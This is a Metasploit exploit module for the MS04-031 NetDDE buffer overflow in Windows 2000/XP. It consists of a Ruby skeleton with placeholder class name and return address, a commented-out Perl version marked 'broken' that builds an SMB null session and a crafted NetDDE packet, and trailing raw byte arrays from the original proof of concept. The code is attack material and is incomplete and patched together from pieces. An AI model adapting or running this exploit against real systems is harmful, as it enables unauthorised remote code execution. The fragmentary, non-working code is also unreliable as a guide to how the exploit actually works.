require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Microsoft NETDDE MSO4-031 Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in the NetDDE
				service. The NetDDE service is not enabled by default and
				must be started manually. This code was based on the
				houseofdabus PoC release to the Bugtraq mailing list.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MSB', 'MS04-031'],
					[ 'CVE', '2004-0206'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::netdde_ms04_031;
use base "Msf::Exploit";
use strict;

my $advanced = 
{ 
	'DirectSMB' => [0,    'Use the direct SMB protocol (445/tcp) instead of SMB over NetBIOS'],
};

my $info =
{
    'Name'  => 'Microsoft NETDDE MSO4-031 Buffer Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'process' },
    'UserOpts'  => 
				{
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 139],
				},

    'Payload' => {
                     'Space' 	=> 1024,
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
	This module exploits a buffer overflow in the NetDDE service. The NetDDE
	service is not enabled by default and must be started manually. This code
	was based on the houseofdabus PoC release to the Bugtraq mailing list.
    }),
                
    'Refs'  =>   [  
			['MSB',     'MS04-031'],
			['CVE',		'2004-0206'],
                 ],
    'Targets'   =>
                 [
			['Windows 2000 English SP1-SP4', 0x009efb60 - 0x20],
		 	['Windows XP English SP0-SP1',   0x00abfb1c - 0x20],
                 ],
    'Keys'  =>  ['broken'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');	
	
	return $self->CheckCode('Safe');
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $target_name = '*SMBSERVER';
	
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	$self->PrintLine(sprintf("[*] Using target %s with return address 0x%.8x...", @{ $target }));

	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return(0);
	}

	my $x = Pex::SMB->new({ 'Socket' => $s });

	if ($target_port != 445 && ! $self->GetVar('DirectSMB')) {
		$x->SMBSessionRequest($target_name);
		if ($x->Error) {
			$self->PrintLine("[*] Session request failed for $target_name");
			return;
		}
	}

	$x->Encrypted(1);
	$x->SMBNegotiate();
	$x->SMBSessionSetup();
	if ($x->Error) {
		$self->PrintLine("[*] Failed to establish a null session");
		return;
	}

	# Determine the real netbios name during the dialect negotiation
	$target_name = $x->DefaultNBName();


	my $netdde;
	
	my $llen = length($target_name) + 4;
	my $rlen = length($target_host);
	
	my $lname = $target_name . "\x20\x20\x20\x20\x01";
	my $rname = $target_host . "\x01";
	
	my $lname_len = pack('n', $llen + 1);
	my $rname_len = pack('n', $rlen + 1);

	my $hod = "HOD-HOD\x01";
	my $hod_len = pack('n', length($hod)); 
	
	my $tmp;
	
	$tmp = $lname_len . $rname_len . $hod_len;
	$tmp .= "\x00";
	$tmp .= $lname;
	$tmp .= $rname;	
	$tmp .= $hod;
	$tmp .= "\x2e";

	$netdde = 
		"\x45\x44\x44\x4E\x00\x00\x00".
		 pack('n', length($tmp)).
		 $tmp.
		 "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".
		 "\x00\x00\x02\x02\x00\x00\x00\x01\x00\x00\x00";
	
	
	return;
}

__END__

char d1[] =  
"\x0d\x12\x0b\x06\x0d\x18\x1c\x01\x10\x03\x12\x08\x1d\x1f\x0a\x0a"  
"\x16\x02\x17\x0e\x1b\x0d";  
  
char req1[] =  
"\x81\x00\x00\x44";  
  
char req2[] =  
"CACACACACACACACACACACACACACACABP";  

1;

=end


end
end	
